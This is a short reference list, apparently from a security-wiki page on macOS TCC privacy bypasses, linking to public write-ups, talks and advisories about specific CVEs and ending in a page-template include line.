- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
